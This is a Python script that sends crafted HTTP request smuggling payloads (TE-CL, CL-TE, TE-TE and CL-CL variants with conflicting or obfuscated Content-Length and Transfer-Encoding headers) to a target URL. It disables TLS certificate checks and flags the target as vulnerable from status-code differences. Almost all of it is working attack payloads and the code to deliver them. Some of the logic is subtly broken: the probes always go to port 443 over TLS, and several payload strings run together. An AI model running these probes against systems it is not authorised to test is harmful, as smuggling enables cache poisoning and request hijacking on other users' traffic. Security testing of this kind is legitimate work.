#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys
import socket, ssl
from time import sleep
from threading import Thread
from urllib.parse import urlparse


# OPTIONS
verbose = 1
socket_timeout = 5
exit_on_first = True
probe_rounds = 3
threads = 5
sleep_per_thread = 0.45


if len(sys.argv) < 2:
    print('[i] Usage: {} URL [METHOD]'.format(sys.argv[0]))
    exit(0)


# PARSE URL
u = urlparse(sys.argv[1])
host = u.hostname
if not host:
    print('[!] Bad URL format. Use http[s]://example.com[:port][/path]')
    exit(0)

method = 'POST' if len(sys.argv) < 3 else sys.argv[2]
uri = '/' if not u.path else u.path
if u.scheme == 'https':
    ssl_enable = True
    port = 443
else:
    ssl_enable = False
    port = 80
if u.port: port = u.port


# BUILD BASE HEADER
base_headers = {
    'Host': host,
    #'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0',
    #'Accept': 'text/html,application/xhtml+xml,application/xml,application/json',
    #'Cookie': 'session=xxxxxxxxxxxxxxxxxxxxx',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Connection': 'keep-alive'
}
base_request = ['{}: {}'.format(k, v) for k, v in base_headers.items()]
base_request_str = '{} {} HTTP/1.1\r\n{}\r\n'.format(method, uri, '\r\n'.join(base_request))


# HTTP SMUGGLING ATTACK PROBES
attacks = {
    'TE-CL': [
        'Transfer-Encoding: chunked\r\nContent-Length: 5\r\n\r\n0\r\n\r\n',
        'Transfer-Encoding: chunked\r\nContent-Length: 6\r\n\r\n0\r\n\r\nX',
        'Content-Length: 3\r\nTransfer-Encoding: chunked\r\n\r\n3\r\nRED\r\n0\r\n\r\n',
        'Content-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n15\r\nXPOST /404 HTTP/1.1\r\n\r\n0\r\n\r\n',
        ('Content-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n5e\r\n'
        'POST /404 HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n'),
        ' Transfer_Encoding: chunked\r\nContent-Length: 6\r\n\r\n0\r\n\r\nX'
    ],
    'CL-TE': [
        'Content-Length: 5\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n',
        'Content-Length: 11\r\nTransfer-Encoding: chunked\r\n\r\n1\r\nZ\r\nQ\r\n\r\n',
        'Content-Length: 5\r\nTransfer-Encoding: chunked\r\n\r\n1\r\nZ\r\nQ\r\n\r\n',
        'Content-Length: 24\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /404 HTTP 1.1\r\n'
        'Content-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX',
        'Content-Length: 5\r\nTransfer_Encoding\n : chunked\r\n\r\n1\r\nZ\r\n0\r\n\r\n',
        'Content-Length: 11\r\nTransfer_Encoding\n : chunked\r\n\r\n1\r\nZ\r\n0\r\n\r\n', 
        'Content-Length: 5\r\nTransfer_Encoding : chunked\r\n\r\n0\r\n\r\n'
    ],
    'TE-TE': [
        'Content-Length: 6\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding:xchunked\r\n\r\n0\r\n\r\nX',
        ('Content-Length: 4\r\nTransfer-Encoding: chunked\r\nTransfer-encoding: cow\r\n\r\n5f\r\n'
        'XPOST /404 HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n'),
        'Content-Length: 6\r\nTransfer-Encoding: chunked\r\nTransfer-encoding: cow\r\n\r\n0\r\n\r\nX'
        'Transfer-Encoding: chunked\r\nTransfer-Encoding: cow\r\n\r\n4\r\nbel\r\nX\r\n',
    ],
    'CL-CL': [
        'Content-Length: 8\r\nContent-Length: 7\r\n\r\n12345\r\nX',
        'Content-Length: 8\r\nContent-Length: 9\r\n\r\n8\r\nred\r\nX',
        'Content-Length: 4\r\nContent-Length: 3\r\n\r\n0\r\nX',
        '*GET / HTTP/1.1\r\nHost: {}\r\nContent-Length: {}\r\n\r\nGET /404 HTTP/1.1\r\nHost: {}\r\n\r\n'.format(host, len(host)+29, host)
    ]
}


# HANDDLE HTTP/HTTPS CONNECTIONS
def connect(domain, port=443, ssl_enable=True):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(socket_timeout)

    connection = ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1_2, cert_reqs=ssl.CERT_NONE) if ssl_enable else s

    try:
        connection.connect((domain, port))
    except socket.error as e:
        print('[!] Abort. {}'.format(e))
        exit()

    return connection


# EXTRACT STATUS CODE FROM SERVER RESPONSE
def get_status(response):
    for line in response.split('\n'):
        if line.startswith('HTTP/1.'):
            return line.split()[1]

    return '000'


# RUN HTTP SMUGGLING ATTACKS AND CHECKS RESULTS
def run_test(domain, port, ssl_enable, request, count=2):
    results = []
    workers = [Thread(target=test_request, args=(domain, port, ssl_enable, request, count, results)) for w in range(threads)]
    for w in workers:
        w.setDaemon(True)
        w.start()
        sleep(sleep_per_thread)

    for w in workers:
        w.join()

    if verbose > 0:
        print('    Test Result: {}'.format(results))

    return any(results)


def test_request(domain, port, ssl_enable, request, count, results):
    responses = []
    for req in range(0, count):
        connection = connect(domain, port, ssl_enable)
        connection.sendall(request.encode())
        response = ''

        while True:
            try:
                data = connection.recv(1024)
            except socket.error as e:
                try:
                    connection.shutdown(socket.SHUT_WR)
                    data = connection.recv(1024)
                except:
                    if verbose > 1:
                        print('[!] {}'.format(e))
                    break
                response += data.decode(errors='ignore')
                if verbose > 1:
                    print('[!] {}'.format(e))
                break
            if not data:
                break
            response += data.decode(errors='ignore')

        connection.close()

        if verbose > 2:
            for r in response.split('\n'):
                print(' < {}'.format(r))

        responses.append(get_status(response))

    if verbose > 0:
        print('      Responses {}'.format(responses))

    if '200' in responses:
        results.append(responses[1:] != responses[:-1])
    else:
        results.append(False)


# ITERATE SMUGGLE PROBES
for attack in attacks:
    print('[i] Testing {}'.format(attack))
    for probe in attacks[attack]:
        if probe.startswith('*'):
            request = probe[1:]
        else:
            request = base_request_str + probe

        if verbose > 1:
            for r in request.split('\n'):
                print(' > {}'.format(r))

        if run_test(host, 443, True, request, probe_rounds):
            print('[!] Vulnerable to {}'.format(attack))
            if verbose == 1:
                for r in request.split('\n'):
                    print(' > {}'.format(r))
            if exit_on_first:
                exit(0)
